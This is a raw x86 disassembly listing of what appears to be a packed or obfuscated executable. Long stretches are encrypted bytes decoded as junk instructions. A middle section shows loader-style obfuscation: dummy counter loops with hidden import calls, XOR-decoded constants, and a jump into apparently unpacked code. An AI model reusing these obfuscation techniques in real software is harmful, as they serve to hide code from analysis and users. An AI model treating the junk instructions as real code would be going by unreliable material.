  411a5e:	neg    ecx
  411a60:	imul   esi,DWORD PTR [edi-0x23],0x3db9dfb2
  411a67:	int3   
  411a68:	or     DWORD PTR [ebx+esi*1-0x43],esi
  411a6c:	mov    esp,0x6b02e52f
  411a71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a72:	cld    
  411a73:	bound  edi,QWORD PTR ds:0xf4f0e4a6
  411a79:	fisubr WORD PTR [edi]
  411a7b:	sub    BYTE PTR [eax+0x54a0c73],bh
  411a81:	sub    BYTE PTR [ebx],cl
  411a83:	jge    0x411a97
  411a85:	lods   al,BYTE PTR ds:[esi]
  411a86:	push   eax
  411a87:	jno    0x411afa
  411a89:	add    al,0x3c
  411a8b:	retf   
  411a8c:	push   ecx
  411a8d:	enter  0x6208,0xb
  411a91:	popa   
  411a92:	xchg   ecx,eax
  411a93:	sbb    eax,0xdd8203
  411a98:	clc    
  411a99:	mov    al,0xba
  411a9b:	loop   0x411ac6
  411a9d:	daa    
  411a9e:	or     BYTE PTR [ecx],bh
  411aa0:	jmp    0xfcc47be0
  411aa5:	pop    esp
  411aa6:	mov    ecx,0x7ed769d9
  411aab:	ins    BYTE PTR es:[edi],dx
  411aac:	cdq    
  411aad:	dec    ecx
  411aae:	sbb    BYTE PTR [ecx+edx*1+0x51],ah
  411ab2:	(bad)  
  411ab3:	imul   esp,DWORD PTR [ebp+0x318e1b16],0xa73d9abf
  411abd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411abe:	sub    eax,DWORD PTR [esi+0x3cbeee87]
  411ac4:	push   ecx
  411ac5:	repz cdq 
  411ac7:	sub    eax,0x82180228
  411acc:	ror    DWORD PTR [ebx-0x580f2b6e],cl
  411ad2:	jo     0x411a5f
  411ad4:	out    dx,eax
  411ad5:	dec    esi
  411ad6:	scas   eax,DWORD PTR es:[edi]
  411ad7:	call   0xe28d:0xca6ae9a8
  411ade:	adc    bh,ch
  411ae0:	inc    esp
  411ae1:	cdq    
  411ae2:	jne    0x411ac7
  411ae4:	mov    al,0xa3
  411ae6:	jl     0x411b12
  411ae8:	in     al,0x44
  411aea:	jno    0x411b0c
  411aec:	xchg   BYTE PTR [ecx+esi*1-0x72],al
  411af0:	or     DWORD PTR cs:[edi+0x3ea1c1e4],esi
  411af7:	icebp  
  411af8:	push   cs
  411af9:	das    
  411afa:	out    dx,eax
  411afb:	rcl    cl,cl
  411afd:	shl    DWORD PTR [ecx+0x1c],cl
  411b00:	or     DWORD PTR [eax-0x12],edi
  411b03:	xchg   ebx,eax
  411b04:	fwait
  411b05:	mov    esi,0xb443981
  411b0a:	or     DWORD PTR [edi],esi
  411b0c:	dec    esp
  411b0d:	mov    ch,0x66
  411b0f:	xchg   esp,eax
  411b10:	add    eax,0xfb8a34b
  411b15:	fld    TBYTE PTR [esi+0x59fe1339]
  411b1b:	xchg   ebx,eax
  411b1c:	xor    BYTE PTR [eax],dl
  411b1e:	loop   0x411b63
  411b20:	stos   DWORD PTR es:[edi],eax
  411b21:	mov    gs,ebp
  411b23:	hlt    
  411b24:	inc    ebx
  411b25:	lahf   
  411b26:	jle    0x411ba7
  411b28:	xor    DWORD PTR [eax-0x4b4c9a57],0xffffffc7
  411b2f:	mov    esi,0xf22db84e
  411b34:	sti    
  411b35:	lods   eax,DWORD PTR ds:[esi]
  411b36:	sahf   
  411b37:	adc    bh,BYTE PTR [esi+ecx*8-0x19763ae4]
  411b3e:	add    dh,bl
  411b40:	js     0x411afe
  411b42:	xchg   esi,eax
  411b43:	inc    edi
  411b44:	fs loopne 0x411ade
  411b47:	aaa    
  411b48:	fld    DWORD PTR [ecx-0x5241aeb3]
  411b4e:	dec    ebx
  411b4f:	xlat   BYTE PTR ds:[ebx]
  411b50:	xor    DWORD PTR [ebp+ebp*2+0x2a],esp
  411b54:	cmp    ebp,eax
  411b56:	mov    bh,0x3c
  411b58:	cmp    eax,0x4dd70a86
  411b5d:	icebp  
  411b5e:	outs   dx,DWORD PTR ds:[esi]
  411b5f:	(bad)  
  411b60:	nop
  411b61:	xor    eax,DWORD PTR [edx]
  411b63:	cmp    al,0xb0
  411b65:	aas    
  411b66:	out    0xaa,al
  411b68:	push   esp
  411b69:	lds    edi,FWORD PTR [ebx-0x3b]
  411b6c:	jmp    FWORD PTR [ebx+ebp*4+0x6c]
  411b70:	sahf   
  411b71:	cwde   
  411b72:	(bad)
  411b75:	(bad)  
  411b76:	lea    ebp,[edx-0xe84f32e]
  411b7c:	mul    DWORD PTR [ebp-0x63]
  411b7f:	pop    ebx
  411b80:	addr16 into 
  411b82:	pop    edi
  411b83:	lahf   
  411b84:	imul   edi,DWORD PTR [ecx-0x57a70972],0x54
  411b8b:	xor    al,0x88
  411b8d:	(bad)  
  411b8e:	popa   
  411b8f:	adc    ebx,esp
  411b91:	pop    ebx
  411b92:	xchg   DWORD PTR [edx],ebp
  411b94:	push   dx
  411b96:	dec    ebx
  411b97:	mov    cs,WORD PTR [ebx+ecx*8-0x7df90c33]
  411b9e:	aad    0x16
  411ba0:	jge    0x411b6b
  411ba2:	popf   
  411ba3:	sbb    bh,BYTE PTR [esi-0x21]
  411ba6:	inc    esp
  411ba7:	adc    DWORD PTR [ebp-0x11],edi
  411baa:	mov    bl,0xfa
  411bac:	ss test al,0x10
  411baf:	test   DWORD PTR [esi-0x38],eax
  411bb2:	shr    DWORD PTR [ebp-0xe4c8c2d],cl
  411bb8:	out    0x14,al
  411bba:	scas   al,BYTE PTR es:[edi]
  411bbb:	sub    eax,0x91ac33c
  411bc0:	clc    
  411bc1:	shr    BYTE PTR [edx+ebx*1],1
  411bc4:	and    ch,BYTE PTR [edx-0x1bb8b10a]
  411bca:	adc    BYTE PTR [edx],bl
  411bcc:	not    bl
  411bce:	test   BYTE PTR [esi],dl
  411bd0:	call   0x87cd:0xa9a646c8
  411bd7:	adc    ebp,DWORD PTR [ebx+edi*2]
  411bda:	jge    0x411c57
  411bdc:	bound  esp,QWORD PTR [edx-0x4a]
  411bdf:	cli    
  411be0:	pop    esi
  411be1:	sbb    al,0x72
  411be3:	mov    edi,DWORD PTR [edi+eiz*4-0x6d]
  411be7:	xchg   DWORD PTR [ecx],eax
  411be9:	or     eax,0xb6df3032
  411bee:	xchg   cl,dh
  411bf0:	lahf   
  411bf1:	mov    ebp,ecx
  411bf3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bf4:	or     ebx,esp
  411bf6:	sub    al,BYTE PTR [esi+eax*4-0x4c]
  411bfa:	clc    
  411bfb:	or     BYTE PTR [ebx],0x40
  411bfe:	int3   
  411bff:	mov    esp,0xbf98867
  411c04:	sbb    dh,al
  411c06:	push   cs
  411c07:	cmp    eax,0x6ab1ba2b
  411c0c:	jge    0x411bdc
  411c0e:	pop    es
  411c0f:	pop    es
  411c10:	mov    ch,0x22
  411c12:	pop    ebp
  411c13:	adc    ebp,esp
  411c15:	lods   al,BYTE PTR ds:[esi]
  411c16:	jbe    0x411c3c
  411c18:	out    0xfa,eax
  411c1a:	je     0x411c85
  411c1c:	pop    esi
  411c1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c1e:	dec    edi
  411c1f:	rcl    BYTE PTR [edi+0x57],0x6a
  411c23:	repnz outs dx,DWORD PTR ds:[esi]
  411c25:	in     eax,0x49
  411c27:	or     DWORD PTR [eax-0x80],edi
  411c2a:	pop    edi
  411c2b:	(bad)  
  411c2c:	push   edi
  411c2d:	ror    DWORD PTR [edi+0x2b],0x42
  411c31:	mov    dh,BYTE PTR [eax-0x4c]
  411c34:	mov    eax,ds:0x8dd9d7f5
  411c39:	(bad)  
  411c3a:	lock inc ecx
  411c3d:	hlt    
  411c3e:	add    BYTE PTR [edx-0x1dc6929],0x71
  411c45:	sub    edx,ecx
  411c47:	jmp    FWORD PTR [ecx+0x1b9f4768]
  411c4d:	xchg   DWORD PTR [esp+edx*8+0x131079d0],edi
  411c54:	imul   edi,DWORD PTR [ebx],0xffffffdd
  411c57:	mov    ds:0xe2d38d3c,al
  411c5c:	pop    ecx
  411c5d:	arpl   WORD PTR [ebx],dx
  411c5f:	mov    eax,ds:0xed32b765
  411c64:	mov    DWORD PTR [edi+0x2a],edi
  411c67:	out    dx,al
  411c68:	xor    eax,0x1e959697
  411c6d:	cmp    al,0xc9
  411c6f:	rcl    DWORD PTR [edi],cl
  411c71:	dec    BYTE PTR [ebp+0x55fd4ae2]
  411c77:	add    eax,0xe307628a
  411c7c:	pop    ebp
  411c7d:	div    BYTE PTR [esi]
  411c7f:	sbb    eax,0x4de3f19b
  411c84:	in     eax,dx
  411c85:	lahf   
  411c86:	mov    ch,0xba
  411c88:	rol    BYTE PTR [edx+0x37],1
  411c8b:	sbb    esp,ebp
  411c8d:	jnp    0x411c82
  411c8f:	push   0xe4b8894f
  411c94:	jp     0x411c41
  411c96:	dec    ebp
  411c97:	ss stos DWORD PTR es:[edi],eax
  411c99:	mov    al,0x41
  411c9b:	adc    BYTE PTR ds:[eax+0x40],bh
  411c9f:	bound  esp,QWORD PTR [edi+edi*2-0x6cab3b77]
  411ca6:	mov    ch,0x65
  411ca8:	jecxz  0x411c3e
  411caa:	in     al,0x51
  411cac:	jo     0x411c4f
  411cae:	jmp    0x21706ee
  411cb3:	scas   eax,DWORD PTR es:[edi]
  411cb4:	push   eax
  411cb5:	adc    BYTE PTR [ebp+0x74570305],cl
  411cbb:	(bad)  
  411cbc:	xor    BYTE PTR [esi+0x16],bl
  411cbf:	xchg   DWORD PTR [edx],esi
  411cc1:	mov    ebx,0xa5eb1e24
  411cc6:	pop    ss
  411cc7:	sbb    dl,BYTE PTR [esi]
  411cc9:	dec    edx
  411cca:	clc    
  411ccb:	(bad)  
  411ccd:	fwait
  411cce:	js     0x411ce7
  411cd0:	lods   eax,DWORD PTR ds:[esi]
  411cd1:	sub    BYTE PTR [edi+0x144388f8],ch
  411cd7:	sbb    DWORD PTR [eax+0x3325eab2],0x5e326aba
  411ce1:	sub    cl,ah
  411ce3:	pop    ss
  411ce4:	fistp  WORD PTR [esp+esi*8-0x4a166514]
  411ceb:	jb     0x411d15
  411ced:	add    al,0xa9
  411cef:	add    dh,dl
  411cf1:	fiadd  WORD PTR [ebx]
  411cf3:	test   eax,0xc7b05eed
  411cf8:	adc    DWORD PTR [eax],ebx
  411cfa:	scas   eax,DWORD PTR es:[edi]
  411cfb:	fwait
  411cfc:	sub    edi,esi
  411cfe:	pop    ebp
  411cff:	xor    DWORD PTR [edx],ecx
  411d01:	pusha  
  411d02:	fucomip st,st(0)
  411d04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d05:	sub    al,0x67
  411d07:	(bad)  
  411d08:	cmp    edx,DWORD PTR [edi+0x55]
  411d0b:	xor    BYTE PTR [edx-0x715775e8],cl
  411d11:	jo     0x411c96
  411d13:	xor    bh,BYTE PTR [eax+esi*2]
  411d16:	out    dx,al
  411d17:	xchg   DWORD PTR [esi],esp
  411d19:	xor    esp,DWORD PTR [edx-0x5a0ea4d7]
  411d1f:	and    BYTE PTR [ecx],0xd3
  411d22:	loope  0x411d5b
  411d24:	mov    bh,0xc6
  411d26:	mov    edi,0xdbc99834
  411d2b:	pop    ecx
  411d2c:	cmc    
  411d2d:	js     0x411cc3
  411d2f:	ins    BYTE PTR es:[edi],dx
  411d30:	adc    edi,esi
  411d32:	mov    edx,DWORD PTR [ebx]
  411d34:	push   edi
  411d35:	fcom   QWORD PTR [eax+0x25]
  411d38:	pusha  
  411d39:	inc    eax
  411d3a:	stos   DWORD PTR es:[edi],eax
  411d3b:	sub    esp,0xdf662e60
  411d41:	cmp    ebp,DWORD PTR [esi-0x3e]
  411d44:	out    dx,al
  411d45:	shl    BYTE PTR [esi+0x20e8b1e0],cl
  411d4b:	sub    ebx,DWORD PTR [ecx]
  411d4d:	out    dx,al
  411d4e:	int3   
  411d4f:	imul   ecx,DWORD PTR ss:[edx],0xffffffc2
  411d53:	mov    dl,BYTE PTR ds:0x8edad25e
  411d59:	jecxz  0x411ce8
  411d5b:	mov    BYTE PTR [edi],al
  411d5d:	add    DWORD PTR [ebx-0x5480a69b],0x76
  411d64:	jmp    0x30f:0x78bb6988
  411d6b:	stos   BYTE PTR es:[edi],al
  411d6c:	stos   BYTE PTR es:[edi],al
  411d6d:	mov    ds:0xbe41960f,al
  411d72:	mov    al,0x9e
  411d74:	sahf   
  411d75:	dec    cx
  411d77:	fmul   st(6),st
  411d79:	push   esp
  411d7a:	and    DWORD PTR [edi-0x69dfdc05],esp
  411d80:	in     al,0x68
  411d82:	ja     0x411d7a
  411d84:	add    esp,DWORD PTR [ecx-0x2c]
  411d87:	mov    ecx,0x8d58f84e
  411d8c:	lock sub eax,0xdaa3577d
  411d92:	call   0x8527:0x45231cea
  411d99:	inc    eax
  411d9a:	iret   
  411d9b:	pop    eax
  411d9c:	(bad)  
  411d9d:	sbb    ebp,DWORD PTR [esi+0x21]
  411da0:	repz call 0xf207:0xd67fd6a2
  411da8:	ins    DWORD PTR es:[edi],dx
  411da9:	outs   dx,BYTE PTR ds:[esi]
  411daa:	(bad)  [edi]
  411dac:	shl    DWORD PTR [ecx-0x7c],0x12
  411db0:	outs   dx,BYTE PTR ds:[esi]
  411db1:	dec    ebp
  411db2:	mov    al,ds:0xc5fd10b8
  411db7:	jg     0x411e12
  411db9:	retf   0x41a
  411dbc:	js     0x411d47
  411dbe:	retf   
  411dbf:	ja     0x411d89
  411dc1:	repnz dec ebx
  411dc3:	outs   dx,DWORD PTR ds:[esi]
  411dc4:	stc    
  411dc5:	mov    ds:0xade931f3,al
  411dca:	pop    eax
  411dcb:	cmp    BYTE PTR [eax-0x25],dh
  411dce:	inc    edx
  411dcf:	cli    
  411dd0:	pop    esp
  411dd1:	xchg   edx,eax
  411dd2:	cwde   
  411dd3:	imul   ebp,esp,0xc40ac51e
  411dd9:	dec    ebp
  411dda:	(bad)  
  411ddb:	retf   
  411ddc:	adc    al,0xd9
  411dde:	int3   
  411ddf:	push   edi
  411de0:	fdiv   QWORD PTR [edx-0x1f6eb33a]
  411de6:	inc    edx
  411de7:	inc    esp
  411de8:	cmp    edx,esp
  411dea:	out    0x6f,eax
  411dec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ded:	and    ebp,DWORD PTR [edx+0x61]
  411df0:	xchg   BYTE PTR [edx+0x3d],dh
  411df3:	inc    ebx
  411df4:	(bad)  
  411df5:	xlat   BYTE PTR ds:[ebx]
  411df6:	out    dx,eax
  411df7:	xor    ebx,DWORD PTR [ebp+0x3f]
  411dfa:	adc    eax,0x52f1f4c6
  411dff:	loop   0x411dab
  411e01:	call   0xe0d7265c
  411e06:	ds push ecx
  411e08:	add    cl,BYTE PTR [ebp+0x7f]
  411e0b:	dec    edx
  411e0c:	and    eax,0xb425a848
  411e11:	mov    ecx,DWORD PTR [eax]
  411e13:	fisttp DWORD PTR [edi+edx*4+0x6ced9dc]
  411e1a:	(bad)  
  411e1c:	stos   BYTE PTR es:[edi],al
  411e1d:	rcl    DWORD PTR [edx],1
  411e1f:	xchg   BYTE PTR [ebx-0x25b47c4f],dl
  411e25:	jecxz  0x411e23
  411e27:	inc    esi
  411e28:	pop    edx
  411e29:	jo     0x411dc9
  411e2b:	aam    0xcb
  411e2d:	sub    BYTE PTR [ebx+0x29],ah
  411e30:	sub    eax,0xda61f3f
  411e35:	jb     0x411e52
  411e37:	mov    ebx,0x3302ada9
  411e3c:	ins    BYTE PTR es:[edi],dx
  411e3d:	mov    ecx,0x859a81ba
  411e42:	lahf   
  411e43:	pop    eax
  411e44:	(bad)  
  411e45:	icebp  
  411e46:	les    esi,FWORD PTR [ebx]
  411e48:	je     0x411dd9
  411e4a:	rol    BYTE PTR [ecx],cl
  411e4c:	jle    0x411eb8
  411e4e:	xor    esi,0x0
  411e51:	cmp    edx,ebx
  411e53:	jne    0x411e75
  411e59:	mov    DWORD PTR ds:0x42900c,0x30b0
  411e63:	cmp    esi,edi
  411e65:	mov    DWORD PTR ds:0x42d000,0x643
  411e6f:	je     0x411edc
  411e75:	sub    edx,0x6beb
  411e7b:	mov    edx,DWORD PTR ds:0x42400a
  411e81:	mov    edx,DWORD PTR [edx+0x1c0]
  411e87:	mov    edx,DWORD PTR [edx]
  411e89:	sub    DWORD PTR ds:0x42c018,0x42901c
  411e93:	xor    esi,esi
  411e95:	add    edx,ecx
  411e97:	adc    esi,0xffffffff
  411e9a:	xor    edx,eax
  411e9c:	and    DWORD PTR ds:0x42d010,0x4e39
  411ea6:	xor    esi,0x0
  411ea9:	mov    DWORD PTR ds:0x42a018,0x6a83
  411eb3:	cmp    edx,0x70941fd1
  411eb9:	mov    DWORD PTR ds:0x42d014,0x6414
  411ec3:	jne    0x411f46
  411ec9:	mov    DWORD PTR ds:0x42b000,0x2399
  411ed3:	cmp    esi,0xffffffff
  411ed6:	jne    0x411f46
  411edc:	mov    edx,DWORD PTR ds:0x42408e
  411ee2:	mov    esi,DWORD PTR ds:0x424086
  411ee8:	xor    edx,esi
  411eea:	mov    DWORD PTR ds:0x424086,edx
  411ef0:	mov    edx,DWORD PTR [ebp+0xc]
  411ef3:	mov    edx,DWORD PTR [edx]
  411ef5:	mov    edx,DWORD PTR [edx]
  411ef7:	mov    esi,DWORD PTR ds:0x424086
  411efd:	add    DWORD PTR [edx],esi
  411eff:	mov    esi,DWORD PTR [ebp+0x8]
  411f02:	mov    edx,DWORD PTR ds:0x424086
  411f08:	xor    esi,0x7510893
  411f0e:	add    esi,0x3272db
  411f14:	xor    ebx,ebx
  411f16:	add    esi,ecx
  411f18:	adc    ebx,0xffffffff
  411f1b:	xor    edi,edi
  411f1d:	xor    esi,eax
  411f1f:	xor    ebx,0x0
  411f22:	add    edx,ecx
  411f24:	adc    edi,0xffffffff
  411f27:	xor    edx,eax
  411f29:	xor    edi,0x0
  411f2c:	cmp    edx,esi
  411f2e:	jne    0x411f46
  411f34:	cmp    edi,ebx
  411f36:	jne    0x411f46
  411f3c:	mov    eax,ds:0x424086
  411f41:	mov    ds:0x42408e,eax
  411f46:	pop    edi
  411f47:	pop    esi
  411f48:	pop    ebx
  411f49:	pop    ebp
  411f4a:	ret    0x8
  411f4d:	push   ebp
  411f4e:	mov    ebp,esp
  411f50:	sub    esp,0x90
  411f56:	add    DWORD PTR ds:0x42a01c,0x734d
  411f60:	push   esi
  411f61:	xor    ecx,0xb67
  411f67:	push   edi
  411f68:	xor    eax,DWORD PTR ds:0x42a018
  411f6e:	mov    eax,ds:0x42400a
  411f73:	add    esi,0x4c8c
  411f79:	mov    DWORD PTR [ebp-0x2c],eax
  411f7c:	xor    ecx,0x3033
  411f82:	mov    eax,ds:0x424116
  411f87:	and    DWORD PTR ds:0x42a010,0x0
  411f91:	mov    esi,DWORD PTR ds:0x42a010
  411f97:	inc    esi
  411f98:	mov    DWORD PTR ds:0x42a010,esi
  411f9e:	cmp    DWORD PTR ds:0x42a010,0xd
  411fa5:	jne    0x411fbe
  411fab:	push   0x1106
  411fb0:	push   DWORD PTR [ebp-0xc]
  411fb3:	push   0x571c
  411fb8:	call   DWORD PTR ds:0x425044
  411fbe:	cmp    DWORD PTR ds:0x42a010,0xc
  411fc5:	jne    0x411fda
  411fcb:	xor    esi,esi
  411fcd:	add    esi,DWORD PTR ds:0x42a010
  411fd3:	inc    esi
  411fd4:	mov    DWORD PTR ds:0x42a010,esi
  411fda:	cmp    DWORD PTR ds:0x42a010,0x14
  411fe1:	jb     0x411f91
  411fe7:	mov    DWORD PTR [ebp-0x3c],eax
  411fea:	and    DWORD PTR ds:0x42b004,edx
  411ff0:	and    DWORD PTR [ebp-0x34],0x0
  411ff4:	xor    ecx,DWORD PTR ds:0x42d010
  411ffa:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  412001:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  412008:	and    edi,DWORD PTR ds:0x42b018
  41200e:	mov    eax,DWORD PTR [ebp-0x1c]
  412011:	mov    ecx,DWORD PTR [ebp-0x1c]
  412014:	xor    edi,DWORD PTR ds:0x42b004
  41201a:	xor    eax,ecx
  41201c:	add    DWORD PTR ds:0x429018,ecx
  412022:	mov    DWORD PTR [ebp-0x1c],eax
  412025:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  41202c:	sub    ecx,esi
  41202e:	mov    eax,DWORD PTR [ebp-0x28]
  412031:	mov    DWORD PTR ds:0x42a010,0x1d
  41203b:	cmp    DWORD PTR ds:0x42a010,0x0
  412042:	je     0x4120a2
  412048:	cmp    DWORD PTR ds:0x42a010,0x4
  41204f:	jne    0x412069
  412055:	push   DWORD PTR [ebp-0x1c]
  412058:	push   0x61a2
  41205d:	push   DWORD PTR [ebp-0x1c]
  412060:	push   DWORD PTR [ebp-0x18]
  412063:	call   DWORD PTR ds:0x425048
  412069:	cmp    DWORD PTR ds:0x42a010,0x5
  412070:	jne    0x412083
  412076:	mov    ecx,DWORD PTR ds:0x42a010
  41207c:	dec    ecx
  41207d:	mov    DWORD PTR ds:0x42a010,ecx
  412083:	mov    ecx,DWORD PTR ds:0x42a010
  412089:	dec    ecx
  41208a:	mov    DWORD PTR ds:0x42a010,ecx
  412090:	jmp    0x41203b
  412095:	movzx  esi,BYTE PTR ds:0x42b010
  41209c:	sub    DWORD PTR ds:0x42c008,esi
  4120a2:	mov    ecx,DWORD PTR [ebp-0x28]
  4120a5:	sub    edi,esi
  4120a7:	xor    eax,ecx
  4120a9:	mov    DWORD PTR [ebp-0x28],eax
  4120ac:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4120b3:	and    DWORD PTR ds:0x42b000,0x0
  4120bd:	mov    eax,ds:0x42b000
  4120c2:	inc    eax
  4120c3:	mov    ds:0x42b000,eax
  4120c8:	cmp    DWORD PTR ds:0x42b000,0x1d
  4120cf:	jne    0x4120de
  4120d5:	push   DWORD PTR [ebp-0x10]
  4120d8:	call   DWORD PTR ds:0x42504c
  4120de:	cmp    DWORD PTR ds:0x42b000,0x16
  4120e5:	jb     0x4120bd
  4120eb:	mov    DWORD PTR ds:0x429018,0x1a
  4120f5:	cmp    DWORD PTR ds:0x429018,0x0
  4120fc:	je     0x412149
  412102:	cmp    DWORD PTR ds:0x429018,0x9
  412109:	jne    0x41211d
  41210f:	push   DWORD PTR [ebp-0x10]
  412112:	push   0x4244ba
  412117:	call   DWORD PTR ds:0x425010
  41211d:	cmp    DWORD PTR ds:0x429018,0xa
  412124:	jne    0x412137
  41212a:	mov    ecx,DWORD PTR ds:0x429018
  412130:	dec    ecx
  412131:	mov    DWORD PTR ds:0x429018,ecx
  412137:	mov    ecx,DWORD PTR ds:0x429018
  41213d:	dec    ecx
  41213e:	mov    DWORD PTR ds:0x429018,ecx
  412144:	jmp    0x4120f5
  412149:	mov    eax,DWORD PTR [ebp-0x18]
  41214c:	adc    ecx,esi
  41214e:	mov    ecx,DWORD PTR [ebp-0x18]
  412151:	xor    eax,ecx
  412153:	xor    esi,esi
  412155:	xor    esi,DWORD PTR ds:0x429028
  41215b:	sbb    DWORD PTR ds:0x429014,esi
  412161:	mov    DWORD PTR [ebp-0x18],eax
  412164:	mov    ecx,DWORD PTR ds:0x423e16
  41216a:	mov    eax,ds:0x424379
  41216f:	sub    ecx,eax
  412171:	imul   ecx,DWORD PTR [ecx+eax*1]
  412175:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  41217c:	mov    DWORD PTR ds:0x42a018,0x18
  412186:	cmp    DWORD PTR ds:0x42a018,0x0
  41218d:	je     0x4121c0
  412193:	cmp    DWORD PTR ds:0x42a018,0x1b
  41219a:	jne    0x4121ac
  4121a0:	push   DWORD PTR [ebp-0x1c]
  4121a3:	push   DWORD PTR [ebp-0x18]
  4121a6:	call   DWORD PTR ds:0x425018
  4121ac:	xor    esi,esi
  4121ae:	or     esi,DWORD PTR ds:0x42a018
  4121b4:	dec    esi
  4121b5:	mov    DWORD PTR ds:0x42a018,esi
  4121bb:	jmp    0x412186
  4121c0:	mov    eax,DWORD PTR [ebp-0x24]
  4121c3:	or     DWORD PTR ds:0x429014,0x2eb5
  4121cd:	mov    ecx,DWORD PTR [ebp-0x24]
  4121d0:	mov    DWORD PTR ds:0x429000,0x1b
  4121da:	cmp    DWORD PTR ds:0x429000,0x0
  4121e1:	je     0x412218
  4121e7:	cmp    DWORD PTR ds:0x429000,0x2a
  4121ee:	jne    0x412206
  4121f4:	push   0x42901c
  4121f9:	push   0x0
  4121fb:	push   0x4243a8
  412200:	call   DWORD PTR ds:0x42501c
  412206:	mov    esi,DWORD PTR ds:0x429000
  41220c:	dec    esi
  41220d:	mov    DWORD PTR ds:0x429000,esi
  412213:	jmp    0x4121da
  412218:	xor    eax,ecx
  41221a:	mov    DWORD PTR [ebp-0x24],eax
  41221d:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  412224:	sbb    eax,DWORD PTR ds:0x429004
  41222a:	mov    eax,DWORD PTR [ebp-0x14]
  41222d:	sub    DWORD PTR ds:0x429018,ecx
  412233:	mov    ecx,DWORD PTR [ebp-0x14]
  412236:	and    DWORD PTR ds:0x42d014,0x19f0
  412240:	xor    eax,ecx
  412242:	mov    DWORD PTR [ebp-0x14],eax
  412245:	mov    eax,DWORD PTR [ebp-0x20]
  412248:	mov    ecx,DWORD PTR [ebp-0x14]
  41224b:	dec    esi
  41224c:	mov    esi,0x7510893
  412251:	and    DWORD PTR ds:0x42a01c,0x5143
  41225b:	xor    eax,esi
  41225d:	and    DWORD PTR ds:0x42a004,0x0
  412267:	jmp    0x41227b
  41226c:	xor    edi,edi
  41226e:	add    edi,DWORD PTR ds:0x42a004
  412274:	inc    edi
  412275:	mov    DWORD PTR ds:0x42a004,edi
  41227b:	cmp    DWORD PTR ds:0x42a004,0x15
  412282:	jae    0x4122c2
  412288:	cmp    DWORD PTR ds:0x42a004,0x5
  41228f:	jne    0x4122a3
  412295:	push   0x42c018
  41229a:	push   DWORD PTR [ebp-0x24]
  41229d:	call   DWORD PTR ds:0x425020
  4122a3:	cmp    DWORD PTR ds:0x42a004,0x4
  4122aa:	jne    0x4122bd
  4122b0:	mov    edi,DWORD PTR ds:0x42a004
  4122b6:	inc    edi
  4122b7:	mov    DWORD PTR ds:0x42a004,edi
  4122bd:	jmp    0x41226c
  4122c2:	mov    edi,0x3272db
  4122c7:	add    eax,edi
  4122c9:	xor    eax,ecx
  4122cb:	mov    DWORD PTR [ebp-0x14],eax
  4122ce:	mov    eax,DWORD PTR [ebp-0x10]
  4122d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4122d4:	sub    eax,ecx
  4122d6:	mov    DWORD PTR [ebp-0x10],eax
  4122d9:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4122e0:	mov    al,BYTE PTR [ebp-0x1]
  4122e3:	movzx  ecx,BYTE PTR [ebp-0x1]
  4122e7:	movzx  eax,al
  4122ea:	sub    ecx,eax
  4122ec:	mov    BYTE PTR [ebp-0x1],cl
  4122ef:	movzx  eax,BYTE PTR [ebp-0x1]
  4122f3:	xor    eax,0xffffff99
  4122f6:	mov    BYTE PTR [ebp-0x1],al
  4122f9:	mov    eax,DWORD PTR [ebp-0x20]
  4122fc:	xor    eax,esi
  4122fe:	add    eax,edi
  412300:	mov    DWORD PTR [ebp-0x14],eax
  412303:	lea    eax,[ebp-0x40]
  412306:	mov    DWORD PTR [ebp-0x38],eax
  412309:	lea    eax,[ebp-0x38]
  41230c:	mov    DWORD PTR [ebp-0x44],eax
  41230f:	lea    eax,[ebp-0x44]
  412312:	mov    DWORD PTR [ebp-0x8],eax
  412315:	lea    eax,[ebp-0x8]
  412318:	mov    DWORD PTR [ebp-0x48],eax
  41231b:	mov    eax,DWORD PTR [ebp-0x18]
  41231e:	jmp    0x41466d
  412323:	test   cl,dl
  412325:	icebp  
  412326:	arpl   WORD PTR gs:[ebp+0x64],sp
  41232a:	scas   eax,DWORD PTR es:[edi]
  41232b:	push   0x8af94cc8
  412330:	jecxz  0x412370
  412332:	int3   
  412333:	fisubr WORD PTR [ebx+0x62]
  412336:	bound  edx,QWORD PTR [eax+0x5f]
  412339:	bound  esp,QWORD PTR [edx-0x79]
  41233c:	xchg   esp,eax
  41233d:	jb     0x4122f2
  41233f:	inc    eax
  412340:	sbb    al,0x9a
  412342:	xchg   eax,esp
  412344:	and    al,0x6
  412346:	loop   0x412317
  412348:	rol    BYTE PTR [ecx],cl
  41234a:	and    ecx,DWORD PTR [ebx+eiz*2-0x7d67e249]
  412351:	inc    edi
  412352:	and    DWORD PTR [ebx],esp
  412354:	jle    0x412382
  412356:	outs   dx,DWORD PTR ds:[esi]
  412357:	pop    edx
  412358:	cmp    al,0x10
  41235a:	jae    0x4123d2
  41235c:	pop    ebx
  41235d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41235e:	xchg   ecx,eax
  41235f:	jns    0x4122ef
  412361:	push   ss
  412362:	add    eax,0x29017f24
  412367:	(bad)  
  412368:	cmp    edx,ecx
  41236a:	dec    DWORD PTR [eax+0x70]
  41236d:	xor    bl,cl
  41236f:	pop    ss
  412370:	bound  edx,QWORD PTR [eax]
  412372:	pop    ds
  412373:	and    edx,DWORD PTR [ecx]
  412375:	cmp    dl,BYTE PTR [edi-0x5d]
  412378:	add    DWORD PTR [ecx],edx
  41237a:	cmc    
  41237b:	push   0xffffff86
  41237d:	cld    
  41237e:	adc    al,0xaf
  412380:	shl    BYTE PTR [edx],cl
  412382:	or     bl,dl
  412384:	pop    ss
  412385:	lea    ebx,[edi]
  412387:	pop    esp
  412388:	outs   dx,DWORD PTR ds:[esi]
  412389:	call   0xafc7ebf4
  41238e:	mov    dl,0x8a
  412390:	cmp    BYTE PTR [ebp+0x59917946],0xa3
